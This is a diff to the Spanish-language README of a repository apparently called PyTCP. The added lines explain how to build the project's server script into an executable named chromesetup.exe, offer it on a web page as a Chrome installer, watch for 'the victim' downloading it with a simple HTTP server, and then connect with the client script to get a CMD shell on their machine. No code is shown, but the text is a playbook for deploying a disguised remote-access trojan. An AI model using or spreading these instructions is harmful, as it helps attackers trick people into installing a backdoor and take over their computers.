@@ -15,3 +15,6 @@ Foto realizada en Notepad++
 ![image](https://github.com/Danucosukosuko/PyTCP/assets/71569318/4155e5f4-8cc6-48c9-87fb-2246ab7f03c2)
 
 ## Este repositorio tiene una plantilla web en la que tienes que añadir chromesetup.exe (Convirtiendo el server.py a exe)
+
+
+Cuando la víctima descargue Chromesetup.exe de este repositorio, usar "python -m http.server" (Recomendado) por que os sale la hora de la descarga de ese archivo para que tú puedas ejecutar el .py del cliente y poder acceder a una terminal de CMD >:-)
